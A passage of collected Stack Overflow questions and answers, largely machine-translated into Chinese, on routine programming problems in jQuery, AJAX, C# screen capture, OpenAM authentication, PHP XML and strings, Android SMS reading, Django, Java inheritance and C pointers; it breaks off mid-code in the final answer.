> 时间：2013-04-06T06:04:08.763
> 
> 标签：jquery, html

我使用 jquery 用鼠标滚轮进行水平滚动。它是工作..

```
 $('html').mousewheel(function (event, delta) {
            this.scrollLeft += (delta * 50);
            event.preventDefault();
        }); 
```

我想要水平滚动内部锚链接点击，

我使用这段代码：

```
 $(".prevscroll").click(function (event) {
               event.preventDefault();
               $.scrollTo(this.hash, 150, { easing: 'elasout' });
        }); 
```

或者

```
 $(window).scrollLeft((Number($(window).scrollLeft()) + 50) + 'px'); 
```

或者

```
 $('body').scrollLeft(50); 
```

但不要滚动！！！！

我的html代码

```
<script type='text/javascript' src="js/jquery.mousewheel.min.js"></script>
<script type='text/javascript' src="js/jquery.min.js"></script>
<script type='text/javascript' src="js/jquery.mousewheel.js"></script>
<style>
 .content
 {
padding: 20px 20px 0;
display: block;
z-index: 1;
height: 340px;
position: relative;
}
#contentWrapper
{
position: absolute;
max-width: 100%;
min-width: 400px;
min-height: 350px;
padding: 0 20px 30px 20px;
z-index: 1;
} 
</style>

<div style="display: block;top:107px" id="contentWrapper">
  <a class="prevscroll"></a>
   <div style="margin-right: 0px;" id="content">
    //My content
   </div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:16:57.280

您应该将`mousewheel`函数绑定到`body`not`html`和`-=`not `+=`。你需要**减少而**不是**增加**你的价值`scrollLeft`

```
$(function() {

    $("body").mousewheel(function(event, delta) {
        var $this = $(this);

        this.scrollLeft -= (delta) * 50;
        event.preventDefault();
    });
}); 
```

演示：http: [//jsfiddle.net/EBPdr/1/](http://jsfiddle.net/EBPdr/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T07:25:47.227

我找到了答案。

```
$(".prevscroll").click(function (event) {
            $('html, body').scrollLeft($('html, body').scrollLeft()+150);
              event.preventDefault();
        }); 
```

# javascript - 有没有办法在回调 xmlHttpReq.onreadystatechange 中更改文档上的全局变量？

> ID：15847636
> 
> 赞同：0
> 
> 时间：2013-04-06T06:04:28.727
> 
> 标签：javascript, jquery, ajax, dom, jquery-templates

我对 AJAX 很陌生，但是现在我想根据回调函数 xmlHttpReq.onreadystatechange 中更改的状态为文档上的全局变量设置一些值，我使用了类似的东西

```
function checkFile(fileUrl) {
    var xmlHttpReq = false;
    var self = this;
        // Mozilla/Safari
    if (window.XMLHttpRequest) {
        self.xmlHttpReq = new XMLHttpRequest();
    }
    // IE
    else if (window.ActiveXObject) {
        self.xmlHttpReq = new ActiveXObject("Microsoft.XMLHTTP");
    }

    if(self.xmlHttpReq == null){
    alert("Your browser does not support XMLHTTPReq")
    }

    self.xmlHttpReq.open('HEAD', fileUrl, true);
    self.xmlHttpReq.onreadystatechange = function() {
        if (self.xmlHttpReq.readyState == 4) {
            if (self.xmlHttpReq.status == 200) { 
         window.rett = 1;
        //alert(window.rett);
           } else if (self.xmlHttpReq.status == 404) { 
         window.rett = 0;
        //alert(window.rett);
            }
        }
    }
    self.xmlHttpReq.send(); 
} 
```

我`checkFile`在这样的 jquery 模板中使用：

```
<script id="resultTemplate" type="text/x-jquery-tmpl"> 
        <li> ${checkFile(link)} <b> {{if window.rett ==  1 }} ${link}   {{/if}}</b> </li> 
    </script> 
```

但是当我`window.rett`在 Jquery 模板中访问时，它说未定义...

我想获取全局值的原因是我想根据全局值生成不同的 GUI。

也许这不是使用全局变量的好习惯？任何建议表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:13:29.243

很可能是因为当您尝试访问它时，AJAX 请求尚未完成（尚未达到状态 4），因此您的全局尚未声明（或者如果是，它仍然包含先前结果的值）

我建议您在回调中使用您的模板。这样，当您的模板检查该值时，该值已经存在：

```
function yourAjaxFunction(arg1, arg2,...,callback){

  //all AJAX setup codes here

  if (self.xmlHttpReq.readyState === 4) {
    if (self.xmlHttpReq.status === 200) { 
      //sending the callback a 1
      callback(1);
    } else if (self.xmlHttpReq.status === 404) { 
      //sending the callback a 1
      callback(0);
    }
  }

  //AJAX send codes

}

//how you should use it
yourAjaxFunction(arg1,arg2,...,function(rett){
  //use rett here
  //parse template here
}); 
```

# c# - Take screenshot of multiple desktops of all visible applications and forms

> ID：15847637
> 
> 赞同：10
> 
> 时间：2013-04-06T06:04:30.760
> 
> 标签：c#, screenshot, desktop-application, multiple-monitors, multiscreen

I'm working with a system that has 4 outputs (monitors) with e.g. 1280x1024 pixels for each output. I need a screenshot of the whole desktop and all open applications on it.

I tried [`GetDesktopWindow()` (MSDN)](https://msdn.microsoft.com/en-US/library/windows/desktop/ms633504(v=vs.85).aspx) but it doesn't work properly. Some forms don't shown on the captured picture.

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-04-07T11:52:38.987

> i tried GetDesktopWindow() function but it doesn't work properly.

Of course not.

The [`GetDesktopWindow`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633504.aspx) function returns a *handle* to the desktop window. It doesn't have anything to do with capturing an image of that window.

Besides, the desktop window is not the same thing as "the entire screen". It refers specifically to the desktop window. See [this article](http://blogs.msdn.com/b/oldnewthing/archive/2004/02/24/79212.aspx) for more information and what can go wrong when you abuse the handle returned by this function.

> i'm working with a system that have 4 outputs (monitors) with 1280x1024(e.g) for each output. i need a screenshot from whole desktop and all open applications on it.

This is relatively simple to do in the .NET Framework using the [`Graphics.CopyFromScreen`](http://msdn.microsoft.com/en-us/library/system.drawing.graphics.copyfromscreen.aspx) method. You don't even need to do any P/Invoke!

The only trick in this case is making sure that you pass the appropriate dimensions. Since you have 4 monitors, passing only the dimensions of the primary screen won't work. You need to pass the dimensions of the entire virtual screen, which contains all of your monitors. Retrieve this by querying the [`SystemInformation.VirtualScreen`](http://msdn.microsoft.com/en-us/library/system.windows.forms.systeminformation.virtualscreen.aspx) property, which returns the bounds of the virtual screen. As the documentation indicates, this is the bounds of the entire desktop on a multiple monitor system.

Sample code:

```
// Determine the size of the "virtual screen", which includes all monitors.
int screenLeft   = SystemInformation.VirtualScreen.Left;
int screenTop    = SystemInformation.VirtualScreen.Top;
int screenWidth  = SystemInformation.VirtualScreen.Width;
int screenHeight = SystemInformation.VirtualScreen.Height;

// Create a bitmap of the appropriate size to receive the screenshot.
using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
{
    // Draw the screenshot into our bitmap.
    using (Graphics g = Graphics.FromImage(bmp))
    {
        g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
    }

    // Do something with the Bitmap here, like save it to a file:
    bmp.Save(savePath, ImageFormat.Jpeg);
} 
```

* * *

**Edit:**

> please check your solution with a wpf application in a thread that is not your main thread. i tried it. it doesn't work!

Hmm, I didn't see a WPF tag on the question or mentioned anywhere in the body.

No matter, though. The code I posted works just fine in a WPF application, as long as you add the appropriate references and using declarations. You will need `System.Windows.Forms` and `System.Drawing`. There might be a more WPF-esque way of doing this that doesn't require a dependency on these WinForms assemblies, but I wouldn't know what it is.

It even works on another thread. There is nothing here that would require the UI thread.

Yes, I tested it. Here is my full test code:

```
using System.Windows;
using System.Windows.Forms;   // also requires a reference to this assembly
using System.Drawing;         // also requires a reference to this assembly
using System.Drawing.Imaging;
using System.Threading;

public partial class MainWindow : Window
{
   public MainWindow()
   {
      InitializeComponent();
   }

   private void button1_Click(object sender, RoutedEventArgs e)
   {
      // Create a new thread for demonstration purposes.
      Thread thread = new Thread(() =>
      {
         // Determine the size of the "virtual screen", which includes all monitors.
         int screenLeft   = SystemInformation.VirtualScreen.Left;
    int screenTop    = SystemInformation.VirtualScreen.Top;
    int screenWidth  = SystemInformation.VirtualScreen.Width;
    int screenHeight = SystemInformation.VirtualScreen.Height;

         // Create a bitmap of the appropriate size to receive the screenshot.
         using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
         {
            // Draw the screenshot into our bitmap.
            using (Graphics g = Graphics.FromImage(bmp))
            {
               g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
            }

            // Do something with the Bitmap here, like save it to a file:
            bmp.Save("G:\\TestImage.jpg", ImageFormat.Jpeg);
         }
      });
      thread.SetApartmentState(ApartmentState.STA);
      thread.Start();
   }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2021-03-25T13:00:00.767

我创建了一个小助手，因为我今天需要这个案例并尝试了许多不同的功能。与监视器的数量无关，您可以将其保存为磁盘上的文件或使用以下代码块将其存储在 db 中的二进制字段中。

### ScreenShotHelper.cs

```
using System.ComponentModel;//This namespace is required for only Win32Exception. You can remove it if you are catching exceptions from another layer.
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace Company.Core.Helpers.Win32 {

    public static class ScreenShotHelper {

        private static Bitmap CopyFromScreen(Rectangle bounds) {
            try {
                var image = new Bitmap(bounds.Width, bounds.Height);
                using var graphics = Graphics.FromImage(image);
                graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                return image;
            }
            catch(Win32Exception) {//When screen saver is active
                return null;
            }
        }

        public static Image Take(Rectangle bounds) {
            return CopyFromScreen(bounds);

        }

        public static byte[] TakeAsByteArray(Rectangle bounds) {
            using var image = CopyFromScreen(bounds);
            using var ms = new MemoryStream();
            image.Save(ms, ImageFormat.Png);
            return ms.ToArray();
        }   

        public static void TakeAndSave(string path, Rectangle bounds, ImageFormat imageFormat) {
            using var image = CopyFromScreen(bounds);
            image.Save(path, imageFormat);
        }
    }
} 
```

### 用法 - 二进制字段

```
var bounds = new Rectangle();
bounds = Screen.AllScreens.Aggregate(bounds, (current, screen) 
                           => Rectangle.Union(current, screen.Bounds));
_card.ScreenShot = Convert.ToBase64String(ScreenShotHelper.TakeAsByteArray(bounds)); 
```

### 用法 - 磁盘文件

```
var bounds = new Rectangle();
bounds = Screen.AllScreens.Aggregate(bounds, (current, screen) 
                           => Rectangle.Union(current, screen.Bounds));
ScreenShotHelper.TakeAndSave(@"d:\screenshot.png", bounds, ImageFormat.Png); 
```

# restful-authentication - Centralized Authentication Server OpenAM vs FreeRadius

> ID：15847640
> 
> 赞同：3
> 
> 时间：2013-04-06T06:05:09.823
> 
> 标签：restful-authentication, openam, freeradius

The basic requirement is to centralize the authentication and authorization of multiple SaaS applications to ease development (each SaaS application using minimal code to authenticate against a single source) and when necessary provide SSO. The authentication mechanism must handle the following options available to the user:

1.  Use Third Party Authentication -- Google
2.  Use our centralized authentication
3.  Use the corporate provided authentication (ADFS)

In my research, I have found many, many ways this can be done and have found OpenAM to be the most complete solution, but then I came across FreeRadius which could also be used.

My Questions are:

1.  There seems to be a plug-in for each tool where one can use the other together (OpenAM - authenticate against radius server), but is there any use case where FreeRadius would be preferred as the SOLE authentication server over OpenAM.

2.  Does OpenAM require that a web agent installed for the server - if all I am doing is serving a Restful Interface (developed in Node.js) - is it possible to authenticate users without installing a web agent (there is no web agent for Node.js).

3.  Can I pass user credentials from Browser -> Server (node.js) -> OpenAM thereby not giving the user the OpenAM login screen. The OpenAM token will be passed from OpenAM -> Server -> Browser (setting the cookies's origin as the SaaS's application. That is each SaaS application server will serve as a "proxy" for user management (authenticate, authorize, and manage[create|update|delete] users)

Thank you

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-06T11:14:52.313

我很早就开始使用 Open Identity Stack 游戏，但我正在部署一个基于 OpenAM（和 OpenIDM + OpenDJ）的解决方案来准确处理您提到的解决方案。

直接回答：

1.  至于将唯一身份验证移交给 FreeRadius，我不明白您为什么要这样做，但一切皆有可能。鉴于您提到了多个目录（身份来源 - google、ADFS 和您的集中式身份验证），我认为连接 OpenAM 以提供 RADIUS 身份验证（即 OpenAM RADIUS 挂钩，而不是 FreeRadius）是有意义的。
2.  不，不必应用网络代理，但它可能有意义。有一些 node.js 可以提供帮助（[https://github.com/alesium/node-openam](https://github.com/alesium/node-openam)）。您只需要从您的服务器与 OpenAM 端 (REST) 对话，这应该很好。
3.  您可以这样做，或者您可以只为 OpenAM 登录屏幕设置外观，使其看起来像您自己的一样。我建议使用后者，因为您随后依赖 OpenAM 来确保登录屏幕的安全性。如果你正在做一个纯粹的代理，那么你就承担了这个负担。您的电话显然是一个设计决定。

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-07T10:07:44.327

您正在将 RADIUS 服务器与 Web SSO 解决方案进行比较……我不确定这是否有意义。

似乎 FreeRadius 没有那么多“身份验证后端”（例如 Oauth 来利用 Google 身份验证）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-03-29T16:40:44.680

我自己正在研究类似要求的解决方案，但我也希望集成 2FA。我见过很多不同的解决方案，但还没有找到最好的解决方案。到目前为止，这是我想出的：

1.  RCDev OpenID 似乎相当全面，对于少于 40 个用户的情况，它是免费的。
2.  Green Rocket 的 GreenRADIUS 价格昂贵，但他们有适用于各种场景的插件并且可以正常工作。
3.  Red Hat 的 KeyCloak 可以与 TACACS+ 或 FreeRADIUS 结合使用来完成此任务

# jquery - jQuery - 根据按钮单击更改一个输入字段的值，然后根据下一个元素或值更改另一个字段的值

> ID：15847645
> 
> 赞同：1
> 
> 时间：2013-04-06T06:05:47.647
> 
> 标签：jquery, forms, append, return-value

这是小提琴：http: [//jsfiddle.net/PfEVd/](http://jsfiddle.net/PfEVd/)

我有以下 HTML：

```
<ul id="timeslots">
    <li><button>10:00 AM</button></li>
    <li><button>10:30 AM</button></li>
    <li><button>11:00 AM</button></li>
    <li><button>11:30 AM</button></li>
    <li><button>12:00 AM</button></li>
    <li><button>12:30 AM</button></li>
    <li><button>1:00 PM</button></li>
    <li><button>1:30 PM</button></li>
    <li><button>2:00 PM</button></li>
    <li><button>2:30 PM</button></li>
    <li><button>3:00 PM</button></li>
</ul>

<form>
    <input type="text" name="appointment_date[start_time]" value="1:00 am" class="time start-time" />
    &mdash;
    <input type="text" name="appointment_date[end_time]" value="1:30 am" class="time end-time" />
</form> 
```

和下面的jQuery：

```
$("#timeslots li button").click(function () {
      var text = $(this).text();
      $("input:text[name='appointment_date[start_time]']").val(text);
}); 
```

我需要弄清楚的是如何同时将“appointment_date[end_time]”的值更改为下一个时间段的开始时间。换句话说，如果您单击“上午 10:00”按钮，则 start_time 更改为上午 10:00，而 end_time 同时更改为上午 10:30。我该怎么做？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:11:21.753

所以你想要父母的下一个兄弟姐妹的孩子的文本。

[jsFiddle](http://jsfiddle.net/Tyriar/nN7eJ/)

```
$("#timeslots li button").click(function () {
    var text = $(this).text();
    $("input:text[name='appointment_date[start_time]']").val(text);

    // Get parent's next sibling's child's text
    var toText = $(this).parent().next().children('button').text()
    $("input:text[name='appointment_date[end_time]']").val(toText);
}); 
```

这不适用于最后一个按钮，因为没有下一个按钮。您最好制作一个函数来获取当前按钮的时间并将其添加 30 分钟。原谅凌乱的代码，但你明白了:)

[jsFiddle](http://jsfiddle.net/Tyriar/MrT67/1/)

```
$("#timeslots li button").click(function () {
    var text = $(this).text();
    $("input:text[name='appointment_date[start_time]']").val(text);

    var toText = addThirtyMinutes(text);
    $("input:text[name='appointment_date[end_time]']").val(toText);
});

function addThirtyMinutes(time) {
    var timeSplit = time.split(' ');
    var hourAndMin = timeSplit[0].split(':');
    hourAndMin[0] = Math.floor(parseInt(hourAndMin[0], 10) + ((parseInt(hourAndMin[1], 10) + 30) / 60));
    if (hourAndMin[0] == 13) {
        hourAndMin[0] = 1;
        timeSplit[1] = 'PM';
    }
    hourAndMin[1] = (parseInt(hourAndMin[1], 10) + 30) % 60;

    return hourAndMin[0] + ':' + (hourAndMin[1] < 10 ? '0' : '') + hourAndMin[1] + ' ' + timeSplit[1];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:21:24.773

**[jsFiddle 演示](http://jsfiddle.net/PfEVd/1/)**

这是我将如何处理这个问题。单击时获取下一个按钮的文本。如果是最后一个，则在 30 分钟窗口内进行硬编码。

```
var all = $("#timeslots li button").length;
var $buttons = $("#timeslots li button");
$buttons.click(function () {
 var text = $(this).text();
 $(".start-time").val(text);
 var next = $buttons.index(this) + 1;
 if( next == all ){
  $(".end-time").val("3:30 PM");   
 }else{
  $(".end-time").val($buttons.eq(next).text());   
 }
}); 
```

# php - 如何删除 XML 元素和所有子元素？

> ID：15847648
> 
> 赞同：1
> 
> 时间：2013-04-06T06:06:11.477
> 
> 标签：php, xml

我需要读取一个`XML`文件并删除所有命名的元素`<images>`和所有关联的子元素。我发现类似的旧问题不起作用。我究竟做错了什么？有没有更好的方法？

`XML:`

```
<?xml version='1.0' encoding='UTF-8'?>
<settings>
  <background_color>#000000</background_color>
  <show_context_menu>yes</show_context_menu>
  <image>
    <thumb_path>210x245.png</thumb_path>
    <big_image_path>620x930.png</big_image_path>
  </image>
  <image>
    <thumb_path>200x295.png</thumb_path>
    <big_image_path>643x950.png</big_image_path>
  </image>
</settings> 
```

`PHP:`

```
$dom = new DOMDocument();
$dom->load('test.xml');
$thedocument = $dom->documentElement;
$elements = $thedocument->getElementsByTagName('image');

foreach ($elements as $node) {
  $node->parentNode->removeChild($node);
}

$save = $dom->saveXML();
file_put_contents('test.xml', $save) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T23:38:29.413

经过一夜好眠，我想通了。其实很简单。

```
$xml = simplexml_load_file('test.xml');
unset($xml->image);
$xml_file = $xml->asXML();
$xmlFile = 'test.xml';
$xmlHandle = fopen($xmlFile, 'w');
fwrite($xmlHandle, $xml_file);
fclose($xmlHandle); 
```

*编辑：*您可能希望直接保存：

```
$file = 'test.xml';

$xml = simplexml_load_file($file);
unset($xml->image);
$success = $xml->asXML($file); 
```

请参阅[`SimpleXMLElement::asXML()`^(*文档*)](http://php.net/SimpleXMLElement.asXML)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:56:24.443

在 PHP 手册页（您应该始终排在第一位 :-) 中，一位出色的贡献者指出：

> [当您在 foreach 循环中迭代它们时，您无法从 DOMNodeList 中删除 DOMNode。](http://www.php.net/manual/en/domnode.removechild.php#90292)

然后继续提供潜在的解决方案。尝试这样的事情：

```
 <?php
    $domNodeList = $domDocument->getElementsByTagname('p');
    $domElemsToRemove = array();
    foreach ( $domNodeList as $domElement ) {
      // ...do stuff with $domElement...
      $domElemsToRemove[] = $domElement;
    }
    foreach( $domElemsToRemove as $domElement ){
      $domElement->parentNode->removeChild($domElement);
    }
    ?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T23:30:07.507

首先，您的 XML 已损坏，请参阅`<thumb>...</thumb_path>`下一行 ->**修复它！**

然后，在 3 行代码中非常简单：

```
$xml = simplexml_load_string($x); // $x holds your xml
$count = $xml->image->count()-1;
for ($i = $count;$i >= 0;$i--) unset($xml->image[$i]); 
```

观看现场演示@http [://codepad.viper-7.com/HkGy5o](http://codepad.viper-7.com/HkGy5o)

# android - How to read sms using Service

> ID：15847650
> 
> 赞同：-4
> 
> 时间：2013-04-06T06:06:25.627
> 
> 标签：android

I am receiving sms using Broadcast Receiver.It is working fine. Now I want to read sms from inbox using service, (which is received by broadcast receiver).

I want to retreive sms from inbox using SERVICE. SMS retreival must be happen in background not in main thread.No any Activity should be used. //Broadcast receiver to receive sms and starting a service via intent public class SMSReceiver extends BroadcastReceiver{

```
@Override
public void onReceive(Context context, Intent intent) {
    Bundle  bundle = intent.getExtras();
    SmsMessage[] message = null;
    String str = "";
    if(bundle != null){
        Object[] pdus = (Object[])bundle.get("pdus");
        message = new SmsMessage[pdus.length];
        for(int i = 0; i<message.length; i++){
            message[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
            str += "New SMS from cloudy contacts " + message[i].getOriginatingAddress();
        }

        Toast.makeText(context, str, Toast.LENGTH_LONG).show();

        Intent intent1 = new Intent(context,MyService.class);
        context.startService(intent1);
    }

} 
```

}

Servie public class MyService extends Service{ ReadSMS readSMS;

```
@Override
public IBinder onBind(Intent arg0) {

    return null;
}

public void onCreate(Bundle savedInstanceState){
    Log.d("Service","inside onCreate of service");

}

public void onDestroy(){
    Log.d("Service", "destroyed");

}

public void onStart(){
    Log.d("Service","starting service to read sms from inbox");
    Toast.makeText(this,"Reading sms from inbox",Toast.LENGTH_LONG).show();
    readSMS = new ReadSMS();
    ArrayList list = readSMS.readSms("inbox");

}

public class ReadSMS{

    public ArrayList readSms(String inbox){
        ArrayList sms = new ArrayList();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, new String[]{"_id","address","date","body"},null,null,null);
        cursor.moveToLast();
        String address = cursor.getString(1);
        String body = cursor.getString(3);
        sms.add(address+" "+body);
        return sms;

    }
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:11:29.563

The Messages in the inbox wouldn't be received by a broadcast receiver since it's not a broadcast. You will have to read the native database on the device.

Take a look [here](https://stackoverflow.com/questions/5547352/how-can-i-read-inbox-in-android-mobile)

EDIT: First of all, doing something from a Service doesn't automatically spawn a background thread. The service will run on the main thread.

> Caution: A service runs in the main thread of its hosting process—the service does not create its own thread and does not run in a separate process (unless you specify otherwise). This means that, if your service is going to do any CPU intensive work or blocking operations (such as MP3 playback or networking), you should create a new thread within the service to do that work. By using a separate thread, you will reduce the risk of Application Not Responding (ANR) errors and the application's main thread can remain dedicated to user interaction with your activities.

Then you can of course spawn a thread yourself, or use an [IntentService](http://developer.android.com/reference/android/app/IntentService.html). But start by reading [here](http://developer.android.com/guide/components/services.html).

# python - django package organization

> ID：15847652
> 
> 赞同：0
> 
> 时间：2013-04-06T06:06:32.860
> 
> 标签：python, django, django-models, package

I plan to build my project in Django framework. However, I noticed that all Django packages have models.py file. Now, let say I have a set of general purpose functions that I share between several apps in the project and I plan to put these functions definitions in a separate package (or app for that matter?). So, should I create an app "general" and copy-paste these functions into the models.py file? Or can I just create a general.py file in the "general" app directory and leave models.py empty? What is the "Django" way to do that?

Thanks.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:17:55.563

`models.py`文件用于定义数据库的结构。所以你应该把它留给定义你的数据库条目。您可以创建一个名为`generals`并放入`general.py`该应用程序的应用程序，然后您可以通过在任何应用程序中调用它来使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:23:18.667

我通常在我的主应用程序下创建一个 utils.py 文件，该文件是在启动项目时从 django-admin.py 创建的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T08:49:29.460

> 我打算将这些函数定义放在一个单独的包中（或应用程序？）

在您决定将其制作为应用程序之前（如果您确实决定将其制作为应用程序），我建议您查看 James Bennet 关于[开发可重用应用程序的主题演讲和关于](http://media.b-list.org/presentations/2008/pycon/reusable_apps.pdf)[布局应用程序](http://www.b-list.org/weblog/2006/sep/10/django-tips-laying-out-application/)的历史帖子。从他的一张幻灯片中：

> 这应该是它自己的应用程序吗？
> 
> *   它与我正在做的其他事情正交吗？
> *   我需要在其他网站上使用类似的功能吗？
> *   是的？然后我应该把它分解成一个单独的应用程序。

如果您在一个通用应用程序中塞入太多功能，最好将通用应用程序拆分为多个可重用应用程序。

回到您最初的问题，Django 期望`models.py`每个应用程序中都有一个文件。因此，即使文件为空，您也必须拥有该文件。

在你的内部`models.py`，你应该只有应用程序的模型类。`models.py`因此，如果您将一些想要重用的杂项代码放入其中，您将不会遵循最佳实践。

从我之前提到的[布置应用程序帖子中：](http://www.b-list.org/weblog/2006/sep/10/django-tips-laying-out-application/)

> 在应用程序级别，我通常会根据应用程序将使用的确切内容添加一些文件：
> 
> *   如果应用程序定义了任何自定义操纵器，我将它们放在一个名为 forms.py 的文件中，而不是在视图文件中。
> *   如果应用程序中有多个自定义管理器，我会将它们放在一个名为 manager.py 的文件中，而不是模型文件中。
> *   如果我要定义任何自定义上下文处理器，我会将它们放在一个名为 context_processors.py 的文件中。
> *   如果我要设置任何自定义调度程序信号，它们会放在一个名为 signals.py 的文件中。
> *   如果应用程序正在设置任何联合提要，则提要类进入名为 feeds.py 的文件中。同样，站点地图类位于 sitemaps.py 中。
> *   中间件类放在一个名为 middleware.py 的文件中。
> *   **任何没有明确转到其他任何地方的杂项代码都放在名为 utils 的文件或模块中。**

所有这些都不能直接回答你原来的问题：

> 我可以在“通用”应用程序目录中创建一个general.py 文件并将models.py 留空吗？

但我希望这能为您提供更多信息，以做出更适合您的项目和要求的决定。

# php - str_replace('\"','',$str) 在服务器上不起作用，为什么？

> ID：15847660
> 
> 赞同：3
> 
> 时间：2013-04-06T06:07:39.380
> 
> 标签：php, string, replace

我在用

```
str_replace('\"','',$str); 
```

替换`'\"'`from php 脚本。它正确地工作`localhost`。

上传时它在服务器上不起作用。为什么 ？

脚本就像， $str=http://www.keralatourism.org/beta-images/Newsletter.jpg\""> 使用 echo str_replace('\"','',$str); 删除 \"

它在本地主机上工作，但不在实时服务器上

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:16:51.600

双引号不需要转义，除非它用双引号括起来。 `str_replace('"','',$str);` 或者 `str_replace("\"",'',$str);`

如果你也想找到反斜杠，我相信你必须用另一个反斜杠来逃避它。

`str_replace('\\"','',$str);` 或者 `str_replace("\\"",'',$str);`

如果您想找到`&quot;`而不是`"`那么您需要将`"`“更改为`&quot;`PHP 认为这些是不同的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:29:52.290

我不完全清楚，但如果你想删除反斜杠只是用户`stripslashes`

```
 $str= 'http://www.keralatourism.org/beta-images/Newsletter.jpg\""';
 echo stripslashes($str); 
```

如果您尝试删除双引号：

```
$str= 'http://www.keralatourism.org/beta-images/Newsletter.jpg\""';
echo str_replace ('"', '', $str); 
```

将双引号包裹在单引号内。

希望这可以帮助你:)

# java - 我对 Java 继承还很陌生，我不明白为什么会出错？

> ID：15847663
> 
> 赞同：1
> 
> 时间：2013-04-06T06:07:54.170
> 
> 标签：java, inheritance

这是问题所在：

**编写营销人员课程以配合本章中描述的其他律师事务所课程。营销人员赚了 50,000 美元（比一般员工多 10,000 美元），并且有一种称为广告的附加方法，该方法打印“立即行动，送完为止！” 确保适当地与 Employee 超类交互。**

到目前为止的代码：

```
public class Marketer extends Employee {   

public Marketer() { 
        setBaseSalary(super.getSalary() + 10000.0);    
    }

    public void advertise() {
        System.out.println("Act now, while supplies last!") ;
    }
} 
```

这就是输出应该是什么：

*50000.0*

*75535.0*

*立即行动，送完为止！*

以下站点上 有一个名为**Employee.java的文件扩展名，上面的代码如下：** [http ://practiceit.cs.washington.edu/problem.jsp?id=1324](http://practiceit.cs.washington.edu/problem.jsp?id=1324)

所以到目前为止，它打印出了***除 75535.0***之外的所有预期结果！我哪里做错了？？当我运行代码时，它这样说（对于我在 75535.0 部分收到的错误）：

*（将基本工资更改为 $65535.00）*

因为我的输出是 65535.0，比答案应该是少 10000。

我似乎找不到错误，因为我刚开始用 Java 做这些继承类的事情，所以我仍然不熟悉它。如果你能帮助我了解我搞砸的地方，谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:19:56.900

这是正在发生的事情：

创建Marketer，它调用Employee 的构造函数和实例初始化。设定`baseSalary`为 40,000。然后您在 Markerter 构造函数中的代码运行并设置`baseSalary`为 50,000。他们的测试驱动程序调用`setBaseSalary`值为 65535.0，覆盖了您的初始设置。

您的代码未与 Employee 类正确交互。中的注释`Employee.java`说您的代码不应该使用、调用或修改以下值。其中之一是`baseSalary`变量，您正在`Marketer`构造函数中对其进行修改。一旦测试驱动程序更改了值，您的班级就无法计算`Marketer`.

你不应该调用`setBaseSalary`你的构造函数。相反，`getSalary`在 Marketer 中重写，并`getSalary`在您自己的类中使用来自 Employee 的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:23:00.187

这是我的解决方案示例：

```
 public class Marketer extends Employee {
        public void advertise() {
            System.out.println("Act now, while supplies last!");
        }
        public double getSalary() {
            return super.getSalary() + 10000;
        }
    } 
```

它应该可以帮助您更好地理解问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:32:42.247

解决您的问题很简单。只需定义Marketer类如下

```
public class Marketer extends Employee {   

    public void advertise() {
        System.out.println("Act now, while supplies last!") ;
    }

    @Override
    public double getSalary() {
        return super.getSalary() + 10000.0;               // $40,000.00
    } 
} 
```

在这里，我们覆盖了 Employee 类的 getSalary 方法，每当我们必须返回薪水时，我们将 10000 加到员工薪水上。

希望这可以帮助

# c - 从函数更新指向 ac 数组的指针

> ID：15847664
> 
> 赞同：1
> 
> 时间：2013-04-06T06:08:04.053
> 
> 标签：c, arrays, function, pointers

假设我有一个`array_push`在 c 中调用的函数。

```
void array_push(int *array_pointer, int array_length, int val) {
    int i;
    int *temp_array = malloc(sizeof(int) * (array_length + 1));

    for (i = 0; i < array_length; i++) {
        temp_array[i] = *array_pointer;
        array_pointer++;
    }

    temp_array[array_length] = val;
    *array_pointer = temp_array;
} 
```

如何更新指针`*array_pointer`以使其指向`temp_array`并且程序的其他部分可以使用新数组？允许我做类似的事情

```
int t[2] = {0,2};
array_push(t, 2);
/* t should now contain {0,2,3} */ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:10:55.077

你需要`array_pointer`变成一个指针到指针：

```
void array_push(int **array_pointer, int array_length, int val) { 
```

（注意额外的星号）。

此外，您需要更改调用站点，使其`t`成为指针，而不是数组（您不能将数组指向其他地方）。最后，为了让调用者知道数组的新大小，`array_length`还需要通过指针传递。

因此，您的代码的整体结构可能类似于：

```
void array_push(int **array_pointer, int *array_length, int val) {
    int *temp_array = malloc(sizeof(int) * (*array_length + 1));
    memcpy(temp_array, *array_pointer, sizeof(int) * *array_length);
    temp_array[(*array_length)++] = val;
    free(*array_pointer);
    *array_pointer = temp_array;
}

int main() {
